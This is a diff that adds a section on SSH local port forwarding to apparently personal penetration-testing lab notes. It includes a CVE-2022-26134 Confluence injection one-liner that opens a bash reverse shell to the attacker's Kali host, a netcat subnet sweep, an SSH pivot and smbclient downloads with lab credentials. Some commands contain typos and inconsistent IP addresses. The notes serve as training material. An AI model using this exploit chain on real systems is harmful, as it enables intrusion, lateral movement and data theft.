@@ -199,3 +199,132 @@ Additional Tools:
 
 
 ## SSH Tunneling
+
+Tunnelinf refers to encapsulating one kind of data stream within another. There are tunnelling protocols, like SSH, that are designed to do this.
+
+SSH is encrypted, while older tools like rsh, rlogin, and telnet are unencrypted.
+
+We can easily blend into the background traffic of a network with SSH tunneling. Net admins use SSH for flexible port forwarding setups in restrictive network situations.
+
+We will commonly find SSH clients on Linux hosts, or even SSH servers. Windows hosts are also commonly found with OpenSSH client software. If the network is not heavily monitored, SSH traffic can look like regular admin traffic, and its contents cannot be easily monitored.
+
+### SSH Local Port Forwarding
+
+```
+172.16.210.217
+HRSHARES 
+
+10.4.210.215
+PGDATABASE01 
+
+192.168.210.63
+CONFLUENCE01
+```
+
+In the previous example, listening and forwarding were done from the same CONFLUENCE01 host.
+
+SSH Local Port Forwarding refers to an SSH connection being made between two hosts (SSH client and SSH server), with a listening port opened by the SSH client, and then all packets received on that listening port are tunneled through the SSH connection to the SSH server. Lastly, the packets are forwarded by the SSH server to the socket we specify.
+
+Imagine Socat is not available on CONFLUENCE01. We still have all the cracked creds and there's no FW preventing us from connecting to the ports we bind on CONFLUENCE01.
+
+Log into the PGDATABASE01 and, after enum, notice it is attached to another internal subnet that has a host with an SMB server open on 445. We want to connect to that server and download stuff back to Kali.
+
+We will create an SSH local port forward as part of our SSH connection from CONFLUENCE01 to PGDATABASE01. We'll bind a listening port 4455 on the WAN iface of CONFLUENCE01, and all packets send to that port will be forwarded thru the SSH tunnel. PGDATABASE01 then forwards the packets to the SMB port 445 on the third host.
+
+As before, we can get a shell on CONFLUENCE01 using the cURL one-liner exploit for CVE-2022-26134, this time without Socat by SSHing directly from CONFLUENCE01 to PGDATABASE01.
+
+We first need to do some enum, because we need to know exactly which IP address and port we want the packets forwarded to in order to set up the SSH local port forward.
+
+We'll use the previous listener/curl exploit.
+
+```console
+kali$ nc -nlvp 4444
+
+kali$ curl http://VULNERABLECONFLUENCEIP:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/KALIIP/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+// make sure we have TTY functionality
+
+confluence$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+// login with database_admin creds we already found
+
+confluence$ ssh database_admin@10.4.50.215
+
+pgdatabase01$ ip addr
+
+pgdatabase01$ ip route
+```
+
+PGDATABASE01 is connected to another subnet in 172.*! There is not a port instakked on PGDATABASE01, but we can do some recon. 
+
+```console
+// sweep fro hosts with open port 445 on this new 172. submet
+
+pgdatabase01$ for i in $(seq 1 254); do nc -zv -w 1 172.16.210.$i 445; done
+
+nc: connect to 172.16.210.215 port 445 (tcp) timed out: Operation now in progress
+nc: connect to 172.16.210.216 port 445 (tcp) timed out: Operation now in progress
+Connection to 172.16.210.217 445 port [tcp/microsoft-ds] succeeded!
+nc: connect to 172.16.210.218 port 445 (tcp) timed out: Operation now in progress
+```
+
+We need to enumerate the SMB service on the host and download anything we find to Kali. Manually, we could use whatever built in tools are on PGDATABASE01, but we would have to download it to PGDATABASE01, transfer it back to CONFLUENCE01, and then back to Kali. This is tedous.
+
+Instead, we can try SSH local port forwarding, creating an SSH conn from CONFLUENCE01 or PGDATABASE01. That connect should include an SSH local port forward, listening on 4455 on the WAN of CONFLUENCE01, forwarding the packets thru the SSH tunnel out of PGDATABASE01 and directly to the SMB share. Then, we can connect to the listening port on CONFLUENCE01 directly from Kali.
+
+For this simple example, there is not firewall preventing us from accessing the ports.
+
+Kill the existing SSH con to PGDATABSE01 and set up a new one with new arguments to establish the SSH port forward.
+
+```console
+confluence$ sh -N -L 0.0.0.0:4455:172.16.210.217:445 database_admin@10.4.210.215
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
+ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+
+// If you get this error, upgrade your shell
+
+confluence$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+confluence$ sh -N -L 0.0.0.0:4455:172.16.210.217:445 database_admin@10.4.210.215
+```
+
+Once you enter the password, you won't get any output since we are running SSH with the -N flag. With -N, SSH won't execute any remote commands, so we will only recieve output related to our port forward.
+
+If the SSH connection or the port forwarding fails for some reason, and the output we get from the standard SSH session isn't sufficient to troubleshoot it, we can pass the -v flag to ssh in order to receive debug output.
+
+Since this reverse shell (4444) from CONFLUENCE01 is now occupied with an open SSH session, we need to catch another reverse shell from CONFLUENCE01. We can do this by listening on another port and modifying our CVE-2022-26134 payload to return a shell to that port.
+
+Confirm the SSH process that we started from the other shell is running, listening on 4455:
+
+```console
+confluence$ ss -ntplu
+tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=4549,fd=4))                                                  
+```
+
+Now we just need to interact with port 4455 on CONFLUENCE01 from Kali.
+
+```console
+kali$ smbclient -p 4455 -L //192.168.210.63/ -U hr_admin --password=Welcome1234
+
+Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Scripts         Disk      
+        Users           Disk
+
+kali$ smbclient -p 4455 //192.168.210.63/scripts -U hr_admin --password=Welcome1234
+smb: \> ls
+  .                                   D        0  Tue Sep 13 04:37:59 2022
+  ..                                 DR        0  Tue Sep  6 11:02:37 2022
+  Provisioning.ps1                   AR     1806  Thu Mar 28 08:17:42 2024
+
+smb: \> get Provisioning.ps1
+```
+
+You can inspect the files you get directly on Kali.
